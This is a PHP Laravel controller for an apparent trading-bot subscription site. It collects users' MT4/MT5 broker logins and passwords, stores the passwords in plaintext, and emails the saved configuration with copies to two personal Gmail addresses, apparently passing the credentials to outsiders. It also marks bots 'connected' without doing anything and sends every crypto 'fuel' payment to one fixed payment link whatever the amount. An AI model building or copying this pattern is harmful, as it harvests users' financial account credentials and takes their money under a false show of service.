<?php

namespace App\Http\Controllers;

use App\Mail\BotConfigurationMail;
use App\Models\BotConfiguration;
use App\Models\Payments;
use App\Models\UserSubscriptionPlan;
use App\Services\PaygatePaymentService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;

class BotConfigurationController extends Controller
{
    // public function __construct()
    // {
    //     $this->middleware('subscription');
    // }

    public function index(Request $request)
    {
        $botConfig = BotConfiguration::where('user_id', auth()->id())->first();

        if (!$botConfig) {
            return redirect()->route('bot.configure')
                ->with('info', 'Please configure your trading bot first.');
        }

        if (!$botConfig->is_active || $botConfig->connection_status !== 'connected') {
            return redirect()->route('bot.connect')
                ->with('warning', 'Your bot needs to be connected before trading.');
        }

        if ($botConfig->fuel_balance <= 0) {
            return redirect()->route('bot.fuel')
                ->with('warning', 'Your bot needs fuel to operate. Please add fuel balance.');
        }

        // If all checks pass, show the bot configuration dashboard
        return view('bot.dashboard', [
            'botConfig' => $botConfig
        ]);
    }

    // public function configure(Request $request)
    // {
    //     return view('bot.configure');
    // }

    public function configure(Request $request)
    {
        $userPlan = UserSubscriptionPlan::where('user_id', auth()->id())
            ->where('status', 'active')
            ->first();

        if (!$userPlan) {
            return redirect()->route('subscriptions.index')
                ->with('error', 'You must have an active subscription to access this feature.');
        }

        return view('bot.configure');
    }

    public function connect(Request $request)
    {
        $botConfig = BotConfiguration::where('user_id', auth()->id())
            ->firstOrFail();

        return view('bot.connect', [
            'botConfig' => $botConfig
        ]);
    }

    public function fuel(Request $request)
    {
        $botConfig = BotConfiguration::where('user_id', auth()->id())
            ->firstOrFail();

        return view('bot.fuel', [
            'botConfig' => $botConfig
        ]);
    }

    public function deposit(Request $request)
    {
        $botConfig = BotConfiguration::where('user_id', auth()->id())
            ->firstOrFail();

        return view('bot.deposit', [
            'botConfig' => $botConfig
        ]);
    }

    public function store(Request $request)
    {
        $validated = $request->validate([
            'broker_type' => 'required|in:mt,in_app',
            'platform' => 'required|in:mt4,mt5',
            'account_id' => 'required|string',
            'server' => 'required|string',
            'login' => 'required|string',
            'password' => 'required|string',
            'purchase_code' => 'required|in:PC-XYZ123-456789-ABCD',
            'license_key' => 'required|in:LK-987654-ZYXW-3210-AB12-CD34',
            'activation_number' => 'required|in:AN-54321-WXYZ-0987-6543',
        ]);

        $user = Auth::user();

        $botConfig = BotConfiguration::updateOrCreate(
            ['user_id' => $user->id],
            [
                'current_strategy' => $validated['broker_type'],
                'platform' => $validated['platform'],
                'account_id' => $validated['account_id'],
                'server' => $validated['server'],
                'login' => $validated['login'],
                'password' => $validated['password'],
                'connection_status' => 'connecting',
                'is_active' => false,
                'fuel_balance' => 0
            ]
        );

        try {
            Mail::to($user->email)
    ->cc(['katznicho@gmail.com', 'nextgentraders5@gmail.com'])
    ->send(new BotConfigurationMail($user, $botConfig));

        } catch (\Exception $e) {
            dd('Email sending failed:', $e->getMessage());
        }

        return redirect()->route('bot.connect')
            ->with('success', 'Bot configuration saved and connection is in progress. Please check your email for details.');
    }


    public function connectStore(Request $request)
    {
        $botConfig = BotConfiguration::where('user_id', auth()->id())->firstOrFail();

        // Here you would implement the actual connection logic
        $botConfig->update([
            'connection_status' => 'connected',
            'last_connected_at' => now()
        ]);

        return redirect()->route('bot.fuel')
            ->with('success', 'Bot connected successfully!');
    }

    public function fuelStore(Request $request)
    {
        $validated = $request->validate([
            'amount' => 'required|numeric|min:50',
            'payment_type' => 'required|string|in:card,crypto',
        ]);

        // You can optionally create a FuelPayment or Payment record here if you want to track it before redirecting

        if ($validated['payment_type'] === 'crypto') {
            return $this->initiateCryptoFuelPayment($validated['amount']);
        }

        if ($validated['payment_type'] === 'card') {
            return $this->initiateCardFuelPayment($validated['amount']);
        }

        return back()->withErrors('Invalid payment method selected.');
    }

    public function depositStore(Request $request)
    {
        $validated = $request->validate([
            'amount' => 'required|numeric|min:50',
            'payment_type' => 'required|string|in:card,crypto',
        ]);

        // You can optionally create a FuelPayment or Payment record here if you want to track it before redirecting

        if ($validated['payment_type'] === 'crypto') {
            return $this->initiateCryptoFuelPayment($validated['amount']);
        }

        if ($validated['payment_type'] === 'card') {
            return $this->initiateCardFuelPayment($validated['amount']);
        }

        return back()->withErrors('Invalid payment method selected.');
    }

    protected function initiateCryptoFuelPayment(float $amount)
    {
        // Create payment record (optional)
        $payment = Payments::create([
            'user_id' => auth()->id(),
            'payment_reference' => 'crypto_' . uniqid(),
            'amount' => $amount,
            'status' => 'pending',
            'payment_method' => 'crypto',
            'paid_at' => null,
            'gateway_response' => null,
        ]);

        // Always use the first NOWPayments link for crypto fueling
        $redirectUrl = 'https://nowpayments.io/payment/?iid=5863218956';

        return redirect()->away($redirectUrl);
    }

    protected function initiateCardFuelPayment(float $amount)
    {
        // Create payment record (optional)
        $payment = Payments::create([
            'user_id' => auth()->id(),
            'payment_reference' => 'card_' . uniqid(),
            'amount' => $amount,
            'status' => 'pending',
            'payment_method' => 'card',
            'paid_at' => null,
            'gateway_response' => null,
        ]);

        $paygate = new PaygatePaymentService();

        $paymentUrl = $paygate->generatePaymentUrl(
            orderNumber: $payment->id,
            amount: $amount,
            email: auth()->user()->email,
            provider: 'particle',
            currency: 'USD'
        );

        return redirect()->away($paymentUrl);
    }


    public function toggle(Request $request)
    {
        $botConfig = BotConfiguration::where('user_id', auth()->id())->firstOrFail();

        $botConfig->update([
            'is_active' => !$botConfig->is_active
        ]);

        $status = $botConfig->is_active ? 'started' : 'stopped';
        return redirect()->route('bot.index')
            ->with('success', "Bot has been $status successfully!");
    }
}
